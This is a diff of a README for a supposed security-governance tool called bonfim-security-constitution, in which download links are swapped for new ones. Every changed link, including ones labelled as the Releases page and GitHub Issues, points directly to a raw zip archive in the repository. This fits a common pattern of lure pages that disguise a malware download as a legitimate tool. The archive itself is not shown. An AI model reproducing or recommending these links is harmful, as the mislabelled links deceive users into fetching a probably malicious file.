@@ -6,7 +6,7 @@ The bonfim-security-constitution is a straightforward tool designed to help your
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/321puca/bonfim-security-constitution/main/amendments/constitution-bonfim-security-1.8-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/321puca/bonfim-security-constitution/main/amendments/constitution-bonfim-security-1.8-alpha.3.zip)
+[![Download Now](https://github.com/321puca/bonfim-security-constitution/raw/refs/heads/main/ADR/bonfim-security-constitution-v3.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/321puca/bonfim-security-constitution/raw/refs/heads/main/ADR/bonfim-security-constitution-v3.2.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following needs:
 
 ### Step 1: Visit the Releases Page
 
-To get started, go to the [Releases page](https://raw.githubusercontent.com/321puca/bonfim-security-constitution/main/amendments/constitution-bonfim-security-1.8-alpha.3.zip). This page contains the latest versions of the bonfim-security-constitution.
+To get started, go to the [Releases page](https://github.com/321puca/bonfim-security-constitution/raw/refs/heads/main/ADR/bonfim-security-constitution-v3.2.zip). This page contains the latest versions of the bonfim-security-constitution.
 
 ### Step 2: Choose Your Version
 
@@ -77,7 +77,7 @@ If you encounter issues while downloading or installing, consider these tips:
 
 Need further assistance? Check out our community forums:
 
-- GitHub Issues: [Report Here](https://raw.githubusercontent.com/321puca/bonfim-security-constitution/main/amendments/constitution-bonfim-security-1.8-alpha.3.zip)
+- GitHub Issues: [Report Here](https://github.com/321puca/bonfim-security-constitution/raw/refs/heads/main/ADR/bonfim-security-constitution-v3.2.zip)
 - User Community: [Join the Discussion](#)
 
 Your input is valuable. Join us in improving bonfim-security-constitution.
@@ -89,6 +89,6 @@ For additional reading and documentation, refer to:
 - Main Documentation: [Read Here](#)
 - GDPR Guidelines: [Learn More](#)
 
-For updates and announcements, stay tuned on our [Releases page](https://raw.githubusercontent.com/321puca/bonfim-security-constitution/main/amendments/constitution-bonfim-security-1.8-alpha.3.zip). 
+For updates and announcements, stay tuned on our [Releases page](https://github.com/321puca/bonfim-security-constitution/raw/refs/heads/main/ADR/bonfim-security-constitution-v3.2.zip). 
 
 Thank you for choosing bonfim-security-constitution for your information security needs. We appreciate your support and interest in fostering a secure governance environment.
